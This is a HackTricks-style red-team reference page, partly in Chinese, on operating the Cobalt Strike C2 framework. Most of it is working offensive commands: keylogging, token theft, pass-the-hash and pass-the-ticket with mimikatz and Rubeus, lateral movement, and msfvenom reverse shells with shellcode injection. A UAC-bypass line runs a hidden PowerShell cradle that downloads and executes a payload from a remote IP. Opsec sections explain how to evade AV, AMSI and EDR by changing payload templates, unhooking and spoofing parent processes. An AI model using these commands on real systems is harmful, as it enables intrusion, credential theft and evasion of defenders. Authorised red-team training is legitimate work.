# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` 然后你可以选择监听位置、要使用的 beacon 类型（http、dns、smb...）等。

### Peer2Peer Listeners

这些 listeners 的 beacon 不需要直接与 C2 通信，它们可以通过其他 beacon 与其通信。

`Cobalt Strike -> Listeners -> Add/Edit` 然后你需要选择 TCP 或 SMB beacon

* **TCP beacon 会在所选端口设置 listener**。要连接到 TCP beacon，请从另一个 beacon 使用命令 `connect <ip> <port>`
* **smb beacon 会使用所选名称在 pipename 上监听**。要连接到 SMB beacon，需要使用命令 `link [target] [pipe]`。

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** 用于 HTA 文件
* **`MS Office Macro`** 用于带有宏的 office 文档
* **`Windows Executable`** 用于 .exe、.dll 或服务 .exe
* **`Windows Executable (S)`** 用于 **stageless** .exe、.dll 或服务 .exe（stageless 优于 staged，因为 IoCs 更少）

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 这会生成一个脚本/可执行文件，用于从 Cobalt Strike 下载 beacon，格式包括：bitsadmin、exe、powershell 和 python

#### Host Payloads

如果你已经有要在 web server 上托管的文件，只需前往 `Attacks -> Web Drive-by -> Host File`，然后选择要托管的文件和 web server 配置。

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- 自定义 agent 只需要使用 Cobalt Strike Team Server 的 HTTP/S 协议（默认的 malleable C2 profile）进行注册/签入并接收任务。实现 profile 中定义的相同 URI、headers、metadata 加密，即可复用 Cobalt Strike UI 来下发任务并获取输出。<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script（例如 `CustomBeacon.cna`）可以封装非 Windows beacon 的 payload 生成，使 operator 能够选择 listener，并直接通过 GUI 生成 ELF payload。
- 暴露给 Team Server 的 Linux 任务处理器示例包括：`sleep`、`cd`、`pwd`、`shell`（执行任意命令）、`ls`、`upload`、`download` 和 `exit`。这些任务会映射到 Team Server 预期的 task ID，并且必须在 server-side 实现，以正确的格式返回输出。
- Linux 上可以通过使用 [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) 在进程内加载 Beacon Object Files 来添加 BOF 支持（也支持 Outflank-style BOF），从而允许 modular post-exploitation 在 implant 的 context/privileges 中运行，而无需创建新进程。<sup>[[2]](#references)[[3]](#references)</sup>
- 在 custom beacon 中嵌入 SOCKS handler，以保持与 Windows Beacons 相同的 pivoting 能力：当 operator 运行 `socks <port>` 时，implant 应打开本地 proxy，将 operator tooling 通过受 compromise 的 Linux host 路由到内部网络。

## Opsec

### Execute-Assembly

**`execute-assembly`** 使用 **sacrificial process**，通过 remote process injection 执行指定程序。该操作非常 noisy，因为要向进程中注入代码会使用某些 Win APIs，而每个 EDR 都会检查这些 API。不过，也有一些 custom tools 可用于在同一进程中加载内容：

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- 在 Cobalt Strike 中也可以使用 BOF (Beacon Object Files)：[https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor` 会在 Cobalt Strike 中创建 `helpx` command，为 commands 添加颜色，以表示它们是否为 BOF（绿色）、Frok&Run（黄色）或类似类型，或者是否为 ProcessExecution、injection 或类似类型（红色）。这有助于判断哪些 commands 更 stealthy。

### 充当用户

你可以检查以下事件，例如 `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`：

- Security EID 4624 - 检查所有 interactive logons，以了解常规工作时间。
- System EID 12,13 - 检查 shutdown/startup/sleep 的频率。
- Security EID 4624/4625 - 检查入站的有效/无效 NTLM 尝试。
- Security EID 4648 - 当使用明文凭据登录时会创建此事件。如果由某个进程生成，则该 binary 可能在 config file 或代码中以明文保存凭据。

在 Cobalt Strike 中使用 `jump` 时，最好使用 `wmi_msbuild` method，使新进程看起来更 legit。

### 使用 computer accounts

Defenders 通常会检查由 users 产生的异常行为，并 **将 service accounts 和 computer accounts（例如 `*$`）排除在 monitoring 之外**。你可以使用这些 accounts 执行 lateral movement 或 privilege escalation。

### 使用 stageless payloads

Stageless payloads 比 staged payloads 更不 noisy，因为它们不需要从 C2 server 下载 second stage。这意味着在初始连接之后不会产生任何 network traffic，因此被 network-based defenses 检测到的可能性更低。

### Tokens & Token Store

窃取或生成 tokens 时要小心，因为 EDR 可能会枚举 thread tokens，并检测到进程中存在 **属于其他 user 的 token**，甚至是 SYSTEM token。

这样可以 **按 beacon 存储 tokens**，无需反复窃取同一个 token。这对于 lateral movement，或需要多次使用被窃取的 token 时很有用：

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

进行 lateral movement 时，通常最好 **窃取 token，而不是生成新 token** 或执行 pass the hash attack。

### Guardrails

Cobalt Strike 有一个名为 **Guardrails** 的功能，可帮助阻止使用某些可能被 defenders 检测到的 commands 或 actions。Guardrails 可以配置为阻止特定 commands，例如 `make_token`、`jump`、`remote-exec`，以及其他通常用于 lateral movement 或 privilege escalation 的 commands。

此外，repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) 还包含一些 checks 和 ideas，你可以在执行 payload 之前加以考虑。

### Tickets encryption

在 AD 中要注意 tickets 的 encryption。默认情况下，一些 tools 会对 Kerberos tickets 使用 RC4 encryption，这不如 AES encryption 安全，而 up to date environments 默认会使用 AES。监控 weak encryption algorithms 的 defenders 可以检测到这一点。

### 避免 Defaults

使用 Cobalt Stricke 时，SMB pipes 默认会使用名称 `msagent_####` 和 `"status_####"`。应更改这些名称。可以使用 command `ls \\.\pipe\` 从 Cobal Strike 中检查现有 pipes 的名称。

此外，在 SSH sessions 中会创建名为 `\\.\pipe\postex_ssh_####` 的 pipe。使用 `set ssh_pipename "<new_name>";` 更改它。

在 poext exploitation attack 中，pipes `\\.\pipe\postex_####` 也可以通过 `set pipename "<new_name>"` 修改。

在 Cobalt Strike profiles 中，你还可以修改以下内容：

- 避免使用 `rwx`
- process injection 的行为方式（将在 `process-inject {...}` block 中使用哪些 APIs）
- "fork and run" 的工作方式（在 `post-ex {…}` block 中）
- sleep time
- 要在 memory 中加载的 binaries 的 max size
- `stage {...}` block 中的 memory footprint 和 DLL content
- network traffic

### 绕过 memory scanning

一些 ERDs 会扫描 memory，以查找已知 malware signatures。Coblat Strike 允许将 `sleep_mask` function 修改为 BOF，从而能够在 memory 中加密 bacldoor。

### Noisy proc injections

将 code 注入进程时通常会非常 noisy，这是因为 **通常没有 regular process 会执行此操作，而且执行该操作的方式非常有限**。因此，它可能会被 behaviour-based detection systems 检测到。此外，EDRs 还可能扫描 network，查找 **包含不在 disk 上的 code 的 threads**（不过，使用 JIT 的 browsers 等进程通常会出现这种情况）。示例：[https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

spawn 新进程时，保持进程之间正常的 **parent-child** 关系非常重要，以避免被检测。如果 svchost.exec 正在执行 iexplorer.exe，这会看起来很可疑，因为在正常的 Windows environment 中，svchost.exe 并不是 iexplorer.exe 的 parent。

在 Cobalt Strike 中 spawn 新 beacon 时，默认会创建一个使用 **`rundll32.exe`** 的进程来运行新的 listener。这不太 stealthy，很容易被 EDRs 检测到。此外，`rundll32.exe` 在没有任何 args 的情况下运行，会使其更加可疑。

使用以下 Cobalt Strike command，可以指定用于 spawn 新 beacon 的不同进程，从而降低其可检测性：
```bash
spawnto x86 svchost.exe
```
你也可以在 profile 中更改此设置 **`spawnto_x86` and `spawnto_x64`**。

### Proxying attackers traffic

攻击者有时需要能够在本地运行工具，即使是在 linux 机器上，并让受害者的流量到达该工具（例如 NTLM relay）。

此外，有时为了执行 pass-the.hash 或 pass-the-ticket attack，对攻击者来说，更隐蔽的做法是在本地将 **该 hash 或 ticket 添加到自己的 LSASS process 中**，然后从中进行 pivot，而不是修改受害机器上的 LSASS process。

但是，你需要对**生成的流量保持谨慎**，因为你可能会从 backdoor process 发送不常见的流量（kerberos？）。为此，你可以 pivot 到 browser process（不过，将自己注入某个 process 可能会被发现，因此请考虑一种 stealth 的方式来完成此操作）。


### 避免 AV

#### AV/AMSI/ETW Bypass

查看此页面：


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常，你可以在 `/opt/cobaltstrike/artifact-kit` 中找到 Cobalt Strike 用于生成 binary beacons 的 payloads 的代码和预编译 templates（位于 `/src-common` 中）。

使用生成的 backdoor（或仅使用编译后的 template）运行 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)，可以找到是什么导致 defender 触发检测。通常这是一个字符串。因此，你只需修改用于生成 backdoor 的代码，使该字符串不会出现在最终的 binary 中。

修改代码后，只需从同一目录运行 `./build.sh`，然后将 `dist-pipe/` 文件夹复制到 Windows client 中的 `C:\Tools\cobaltstrike\ArtifactKit`。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
别忘了加载 aggressive script `dist-pipe\artifact.cna`，以指示 Cobalt Strike 使用我们指定的磁盘资源，而不是已加载的资源。

#### Resource Kit

ResourceKit 文件夹包含 Cobalt Strike 基于 script 的 payload 模板，包括 PowerShell、VBA 和 HTA。

使用模板配合 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)，你可以找出 Defender（此处为 AMSI）不喜欢的内容并对其进行修改：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
修改检测到的行后，可以生成一个不会被捕获的模板。

不要忘记加载攻击性脚本 `ResourceKit\resources.cna`，以告知 Cobalt Strike 使用我们指定的磁盘资源，而不是已加载的资源。

#### Function hooks | Syscall

函数 hooking 是 EDR 检测恶意活动的一种非常常见的方法。Cobalt Strike 允许你通过使用 **syscalls**（而不是标准 Windows API 调用）来绕过这些 hooks，具体方式包括使用 **`None`** 配置，使用 **`Direct`** 设置调用函数的 `Nt*` 版本，或者在 malleable profile 中使用 **`Indirect`** 选项直接跳过 `Nt*` 函数。根据系统的不同，某种选项可能会比其他选项更加隐蔽。

这可以在 profile 中设置，也可以使用 **`syscall-method`** 命令设置。

但是，这也可能产生较明显的噪声。

Cobalt Strike 提供的另一种绕过函数 hooks 的方法，是使用 [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) 移除这些 hooks。

你也可以使用 [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 或 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) 检查哪些函数被 hook。




<details>
<summary>杂项 Cobalt Strike 命令</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon（自定义 implant PoC）](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader 和 Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF 模板](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42 对 Cobalt Strike 元数据加密的分析](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC 关于 Cobalt Strike 流量的日志](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
